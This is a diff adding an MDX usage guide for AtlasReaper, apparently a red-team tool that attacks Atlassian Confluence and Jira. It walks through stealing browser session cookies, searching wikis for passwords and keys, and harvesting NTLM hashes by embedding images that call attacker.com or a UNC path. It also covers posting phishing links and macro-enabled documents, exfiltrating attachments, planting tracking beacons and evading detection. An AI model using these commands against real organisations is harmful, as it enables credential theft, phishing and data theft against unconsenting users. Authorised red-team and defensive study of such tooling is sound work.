@@ -1,0 +1,546 @@
+---
+title: 'Usage Guide'
+description: 'Practical examples and operational scenarios for AtlasReaper'
+icon: 'terminal'
+---
+
+## Getting Help
+
+```bash
+# Display general help
+AtlasReaper.exe help
+
+# Get help for specific command
+AtlasReaper.exe confluence -h
+AtlasReaper.exe jira --help
+
+# Get help for specific subcommand
+AtlasReaper.exe confluence search --help
+AtlasReaper.exe jira createissue -h
+```
+
+## Authentication Methods
+
+### Using Session Tokens
+
+Extract session tokens from a user's browser:
+
+<Steps>
+  <Step title="Extract Cookies with SharpChrome">
+    ```bash
+    SharpChrome.exe cookies /showall
+    ```
+  </Step>
+
+  <Step title="Identify Atlassian Session Tokens">
+    Look for cookies matching these patterns:
+    - Domain: `*.atlassian.net`
+    - Names: `cloud.session.token` or `tenant.session.token`
+  </Step>
+
+  <Step title="Use Token in Commands">
+    ```bash
+    $cookie = "cloud.session.token=eyJhbGc..."
+    $url = "https://company.atlassian.net"
+
+    AtlasReaper.exe confluence listspaces --url $url --cookie $cookie
+    ```
+  </Step>
+</Steps>
+
+### Testing Anonymous Access
+
+Some Confluence/Jira instances allow anonymous access:
+
+```bash
+# Test without cookie
+AtlasReaper.exe confluence listspaces --url https://company.atlassian.net
+
+# If successful, anonymous access is enabled
+AtlasReaper.exe jira listprojects --url https://company.atlassian.net
+```
+
+## Operational Scenarios
+
+### Scenario 1: Initial Reconnaissance
+
+Goal: Map available resources and gather intelligence
+
+<Steps>
+  <Step title="Test Access">
+    ```bash
+    # Test anonymous access
+    AtlasReaper.exe confluence listspaces --url $url
+
+    # If denied, use session token
+    AtlasReaper.exe confluence listspaces --url $url --cookie $cookie
+    ```
+  </Step>
+
+  <Step title="Enumerate Confluence">
+    ```bash
+    # List all spaces
+    AtlasReaper.exe confluence listspaces --url $url --cookie $cookie
+
+    # List pages in a space
+    AtlasReaper.exe confluence listpages --space-key "ENG" --url $url --cookie $cookie
+
+    # List attachments
+    AtlasReaper.exe confluence listattachments --page-id "12345" --url $url --cookie $cookie
+    ```
+  </Step>
+
+  <Step title="Enumerate Jira">
+    ```bash
+    # List all projects
+    AtlasReaper.exe jira listprojects --url $url --cookie $cookie
+
+    # List issues in a project
+    AtlasReaper.exe jira listissues --project "SEC" --url $url --cookie $cookie
+
+    # Enumerate users
+    AtlasReaper.exe jira listusers --url $url --cookie $cookie
+    ```
+  </Step>
+
+  <Step title="Search for Sensitive Data">
+    ```bash
+    # Search Confluence for passwords
+    AtlasReaper.exe confluence search --query "password*" --url $url --cookie $cookie
+
+    # Search for API keys
+    AtlasReaper.exe confluence search --query "api*key*" --url $url --cookie $cookie
+
+    # Search Jira issues
+    AtlasReaper.exe jira searchissues --query "credentials" --url $url --cookie $cookie
+    ```
+  </Step>
+</Steps>
+
+### Scenario 2: Credential Farming
+
+Goal: Harvest NTLM hashes or credentials via embedded images
+
+<Steps>
+  <Step title="Set Up Harvesting Infrastructure">
+    ```bash
+    # On attacker machine, start Responder
+    sudo responder -I eth0 -wrf
+
+    # Or use custom web server with authentication logging
+    ```
+  </Step>
+
+  <Step title="Identify Target Pages">
+    ```bash
+    # Find high-traffic pages
+    AtlasReaper.exe confluence listpages --space-key "ANNOUNCEMENTS" --url $url --cookie $cookie
+
+    # Target landing pages or frequently accessed documentation
+    ```
+  </Step>
+
+  <Step title="Embed 1x1 Pixel Image">
+    ```bash
+    # Embed image pointing to attacker server
+    AtlasReaper.exe confluence embed --page-id "12345" --image-url "http://attacker.com/harvest.png" --url $url --cookie $cookie
+
+    # Or use UNC path for NTLM capture
+    AtlasReaper.exe confluence embed --page-id "12345" --image-url "//attacker.com/share/image.png" --url $url --cookie $cookie
+    ```
+  </Step>
+
+  <Step title="Monitor for Captures">
+    Monitor your harvesting server for incoming authentication attempts and captured hashes.
+  </Step>
+</Steps>
+
+### Scenario 3: Social Engineering
+
+Goal: Create believable content for phishing or information gathering
+
+<Steps>
+  <Step title="Create Legitimate-Looking Issue">
+    ```bash
+    # Create plausible support request
+    AtlasReaper.exe jira createissue \
+      --project "SUPPORT" \
+      --issue-type "Task" \
+      --message "Unable to access VPN from new device. Please advise on onboarding process." \
+      --url $url --cookie $cookie
+    ```
+  </Step>
+
+  <Step title="Add Malicious Link">
+    ```bash
+    # Add comment with phishing link
+    AtlasReaper.exe jira addcomment \
+      --issue-key "SUP-456" \
+      --comment "Please complete your security training at https://phish-site.com/training" \
+      --url $url --cookie $cookie
+    ```
+  </Step>
+
+  <Step title="Attach Weaponized File">
+    ```bash
+    # Attach macro-enabled document
+    AtlasReaper.exe jira attach \
+      --issue-key "SUP-456" \
+      --file "Security_Policy_2024.docm" \
+      --url $url --cookie $cookie
+    ```
+  </Step>
+
+  <Step title="Add Link to Confluence Page">
+    ```bash
+    # Link to external resource
+    AtlasReaper.exe confluence link \
+      --page-id "12345" \
+      --link-url "https://malicious-site.com" \
+      --link-text "Updated Security Guidelines" \
+      --url $url --cookie $cookie
+    ```
+  </Step>
+</Steps>
+
+### Scenario 4: Data Exfiltration
+
+Goal: Download sensitive attachments and documents
+
+<Steps>
+  <Step title="Search for Valuable Content">
+    ```bash
+    # Search for financial documents
+    AtlasReaper.exe confluence search --query "*budget*.xlsx" --url $url --cookie $cookie
+
+    # Search for architecture diagrams
+    AtlasReaper.exe confluence search --query "architecture*diagram*" --url $url --cookie $cookie
+    ```
+  </Step>
+
+  <Step title="List Available Attachments">
+    ```bash
+    # List attachments on discovered pages
+    AtlasReaper.exe confluence listattachments --page-id "67890" --url $url --cookie $cookie
+
+    # List attachments on Jira issues
+    AtlasReaper.exe jira listattachments --issue-key "PROJ-123" --url $url --cookie $cookie
+    ```
+  </Step>
+
+  <Step title="Download Attachments">
+    ```bash
+    # Download from Confluence
+    AtlasReaper.exe confluence download \
+      --attachment-id "98765" \
+      --output "C:\exfil\architecture.pdf" \
+      --url $url --cookie $cookie
+
+    # Download from Jira
+    AtlasReaper.exe jira download \
+      --attachment-id "45678" \
+      --output "C:\exfil\credentials.xlsx" \
+      --url $url --cookie $cookie
+    ```
+  </Step>
+</Steps>
+
+### Scenario 5: Persistence & Monitoring
+
+Goal: Maintain access and monitor for new information
+
+<Steps>
+  <Step title="Create Monitoring Issue">
+    ```bash
+    # Create issue to receive notifications
+    AtlasReaper.exe jira createissue \
+      --project "INTERNAL" \
+      --issue-type "Task" \
+      --message "Monitoring infrastructure changes" \
+      --url $url --cookie $cookie
+    ```
+  </Step>
+
+  <Step title="Embed Persistent Beacon">
+    ```bash
+    # Embed tracking image on multiple pages
+    AtlasReaper.exe confluence embed \
+      --page-id "11111" \
+      --image-url "http://attacker.com/beacon1.png" \
+      --url $url --cookie $cookie
+
+    AtlasReaper.exe confluence embed \
+      --page-id "22222" \
+      --image-url "http://attacker.com/beacon2.png" \
+      --url $url --cookie $cookie
+    ```
+  </Step>
+
+  <Step title="Monitor Access Patterns">
+    Analyze beacon callbacks to identify active pages and user activity patterns.
+  </Step>
+</Steps>
+
+## Advanced Usage
+
+### Wildcard Searching
+
+Use wildcards for flexible searches:
+
+```bash
+# Search for URLs containing example.com
+AtlasReaper.exe confluence search --query "http*example.com*" --url $url --cookie $cookie
+
+# Search for credentials with various formats
+AtlasReaper.exe confluence search --query "*password*" --url $url --cookie $cookie
+
+# Search for AWS keys
+AtlasReaper.exe confluence search --query "AKIA*" --url $url --cookie $cookie
+
+# Search for private keys
+AtlasReaper.exe confluence search --query "*BEGIN*PRIVATE*KEY*" --url $url --cookie $cookie
+```
+
+### Batch Operations
+
+PowerShell wrapper for bulk operations:
+
+```powershell
+# Download all attachments from a page
+$pageId = "12345"
+$attachments = AtlasReaper.exe confluence listattachments --page-id $pageId --url $url --cookie $cookie | ConvertFrom-Json
+
+foreach ($attachment in $attachments) {
+    AtlasReaper.exe confluence download `
+        --attachment-id $attachment.id `
+        --output "C:\downloads\$($attachment.title)" `
+        --url $url --cookie $cookie
+}
+```
+
+```powershell
+# Embed tracking pixels on all pages in a space
+$pages = AtlasReaper.exe confluence listpages --space-key "DOCS" --url $url --cookie $cookie | ConvertFrom-Json
+
+foreach ($page in $pages) {
+    AtlasReaper.exe confluence embed `
+        --page-id $page.id `
+        --image-url "http://attacker.com/track_$($page.id).png" `
+        --url $url --cookie $cookie
+}
+```
+
+### Automation Script
+
+```powershell
+# Automated reconnaissance script
+param(
+    [string]$url,
+    [string]$cookie
+)
+
+$timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
+$outputDir = "recon_$timestamp"
+New-Item -ItemType Directory -Path $outputDir | Out-Null
+
+Write-Host "[*] Starting AtlasReaper reconnaissance..."
+
+# Confluence enumeration
+Write-Host "[*] Enumerating Confluence spaces..."
+AtlasReaper.exe confluence listspaces --url $url --cookie $cookie |
+    Out-File "$outputDir\confluence_spaces.json"
+
+Write-Host "[*] Searching for sensitive data..."
+@("password*", "api*key*", "secret*", "*credentials*") | ForEach-Object {
+    $query = $_
+    Write-Host "[*] Searching for: $query"
+    AtlasReaper.exe confluence search --query $query --url $url --cookie $cookie |
+        Out-File "$outputDir\search_$query.json"
+}
+
+# Jira enumeration
+Write-Host "[*] Enumerating Jira projects..."
+AtlasReaper.exe jira listprojects --url $url --cookie $cookie |
+    Out-File "$outputDir\jira_projects.json"
+
+Write-Host "[*] Enumerating users..."
+AtlasReaper.exe jira listusers --url $url --cookie $cookie |
+    Out-File "$outputDir\jira_users.json"
+
+Write-Host "[+] Reconnaissance complete! Results in $outputDir"
+```
+
+## OPSEC Best Practices
+
+### Timing and Rate Limiting
+
+```bash
+# Space out requests to avoid detection
+Start-Sleep -Seconds 5
+
+# Randomize timing
+Start-Sleep -Seconds (Get-Random -Minimum 3 -Maximum 10)
+
+# Limit concurrent operations
+$throttle = 3  # Max 3 concurrent requests
+```
+
+### Session Token Management
+
+```powershell
+# Rotate between multiple session tokens if available
+$tokens = @(
+    "cloud.session.token=eyJhbGc...",
+    "cloud.session.token=eyJhbGd...",
+    "cloud.session.token=eyJhbGR..."
+)
+
+$currentToken = $tokens | Get-Random
+
+AtlasReaper.exe confluence search --query "password*" --url $url --cookie $currentToken
+```
+
+### Cleanup Operations
+
+```bash
+# Document embedded images for later removal
+$embeddings = @()
+
+# Track each embedding
+$result = AtlasReaper.exe confluence embed --page-id "12345" --image-url "http://attacker.com/img.png" --url $url --cookie $cookie
+$embeddings += @{PageId="12345"; ImageUrl="http://attacker.com/img.png"}
+
+# After operation, remove traces (manual cleanup required via web interface)
+```
+
+## Troubleshooting
+
+<AccordionGroup>
+  <Accordion title="Authentication Failures" icon="lock">
+    **Symptoms:** Commands fail with authentication errors
+
+    **Solutions:**
+    - Verify session token is still valid
+    - Check token format (should include cookie name)
+    - Ensure URL is correct (https://company.atlassian.net)
+    - Test with anonymous access first
+    - Extract fresh session token from browser
+  </Accordion>
+
+  <Accordion title="Rate Limiting" icon="gauge-high">
+    **Symptoms:** Requests failing after rapid enumeration
+
+    **Solutions:**
+    - Space out requests with delays
+    - Use smaller batch sizes
+    - Reduce search result limits
+    - Wait for rate limit reset (typically 1-5 minutes)
+    - Use multiple session tokens if available
+  </Accordion>
+
+  <Accordion title="Permission Denied" icon="ban">
+    **Symptoms:** Access denied for certain operations
+
+    **Solutions:**
+    - Session token user lacks necessary permissions
+    - Target space/project has restricted access
+    - Anonymous access disabled for that resource
+    - Verify user permissions in Atlassian admin panel
+    - Try with different session token (higher privileges)
+  </Accordion>
+
+  <Accordion title="Unexpected Crashes" icon="triangle-exclamation">
+    **Symptoms:** Tool crashes during operations
+
+    **Solutions:**
+    - Tool not thoroughly tested in all environments
+    - Try with simpler operations first
+    - Check for edge cases in input data
+    - Verify .NET Framework version
+    - Report issue to GitHub repository
+  </Accordion>
+</AccordionGroup>
+
+## Output Formats
+
+Most commands output JSON for easy parsing:
+
+```powershell
+# Parse JSON output
+$spaces = AtlasReaper.exe confluence listspaces --url $url --cookie $cookie | ConvertFrom-Json
+
+foreach ($space in $spaces) {
+    Write-Host "Space: $($space.name) - Key: $($space.key)"
+}
+```
+
+```bash
+# Use jq for parsing in Linux
+AtlasReaper.exe jira listprojects --url $url --cookie $cookie | jq '.[] | {name: .name, key: .key}'
+```
+
+## Integration Examples
+
+### With Responder (Credential Harvesting)
+
+```bash
+# Terminal 1: Start Responder
+sudo responder -I eth0 -wrf
+
+# Terminal 2: Embed tracking images
+AtlasReaper.exe confluence embed \
+    --page-id "12345" \
+    --image-url "//192.168.1.100/share/image.png" \
+    --url $url --cookie $cookie
+
+# Monitor Terminal 1 for captured NTLM hashes
+```
+
+### With SharpChrome (Token Extraction)
+
+```bash
+# Extract cookies
+SharpChrome.exe cookies /showall | Select-String -Pattern "cloud.session.token|tenant.session.token"
+
+# Use extracted token
+$cookie = "cloud.session.token=<extracted_value>"
+AtlasReaper.exe confluence listspaces --url $url --cookie $cookie
+```
+
+## Common Patterns
+
+### Reconnaissance Checklist
+
+```bash
+# 1. Test access
+AtlasReaper.exe confluence listspaces --url $url
+
+# 2. Enumerate resources
+AtlasReaper.exe confluence listspaces --url $url --cookie $cookie
+AtlasReaper.exe jira listprojects --url $url --cookie $cookie
+
+# 3. Search for sensitive data
+AtlasReaper.exe confluence search --query "password*" --url $url --cookie $cookie
+AtlasReaper.exe confluence search --query "*api*key*" --url $url --cookie $cookie
+
+# 4. Enumerate users
+AtlasReaper.exe jira listusers --url $url --cookie $cookie
+
+# 5. Download valuable attachments
+AtlasReaper.exe confluence listattachments --page-id "..." --url $url --cookie $cookie
+AtlasReaper.exe confluence download --attachment-id "..." --output "file.pdf" --url $url --cookie $cookie
+```
+
+## Next Steps
+
+<CardGroup cols={3}>
+  <Card title="Confluence Commands" icon="book" href="/atlasreaper-docs/confluence/listspaces">
+    Explore Confluence operations
+  </Card>
+  <Card title="Jira Commands" icon="list-check" href="/atlasreaper-docs/jira/listprojects">
+    Explore Jira operations
+  </Card>
+  <Card title="Blog Post" icon="newspaper" href="https://medium.com/specter-ops-posts/sowing-chaos-and-reaping-rewards-in-confluence-and-jira-7a90ba33bf62">
+    Read the research blog post
+  </Card>
+</CardGroup>
